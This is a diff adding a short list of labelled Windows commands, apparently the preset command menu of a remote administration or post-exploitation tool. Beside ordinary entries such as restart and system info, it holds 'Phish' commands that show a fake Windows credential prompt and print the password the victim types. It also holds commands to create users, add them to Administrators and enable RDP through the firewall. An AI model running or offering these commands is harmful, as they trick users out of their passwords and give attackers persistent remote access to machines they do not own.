@@ -1,0 +1,15 @@
+Send File:C:\Temp\
+Get PS Version:powershell "$PSVersionTable"
+Get SysInfo:powershell "gwmi Win32_QuickFixEngineering | Select Description, HotFixID, InstalledBy, InstalledOn; gwmi Win32_OperatingSystem | Select Caption, ServicePackMajorVersion, OSArchitecture, BootDevice, BuildNumber, CSName, CSDVersion, NumberOfUsers, Version | FL"
+Windows PSv3+ Phish:powershell "Get-Credential -User $(whoami).Split('\')[1] -Message 'Windows requires your credentials to continue' | % {Write-Host $_.UserName '->' $_.GetNetworkCredential().password}"
+Windows PSv2- Phish:powershell "Get-Credential | % {Write-Host $_.UserName '->' $_.GetNetworkCredential().password}"
+Windows Alert:powershell "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Message', 'Title')"
+Logoff User:shutdown /l
+Restart:powershell "Restart-Computer"
+Shutdown:powershell "Stop-Computer"
+Add User:net user <USER> <PASSWORD> /ADD
+Change User Password:net user <USER> <PASSWORD>
+Delete User:net user <USER> /DELETE
+Enable RDP:powershell "$key='HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'; if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }; New-ItemProperty -Path $key -Name 'fDenyTSConnections' -PropertyType 'DWORD' -Value 0 -Force | Out-Null; netsh advfirewall firewall set rule group='remote desktop' new enable=yes"
+Add User to Remote Desktop Users Group:net localgroup "Remote Desktop Users" /ADD "<user>"
+Add User to Administrators Group:net localgroup "Administrators" /ADD "<user>"
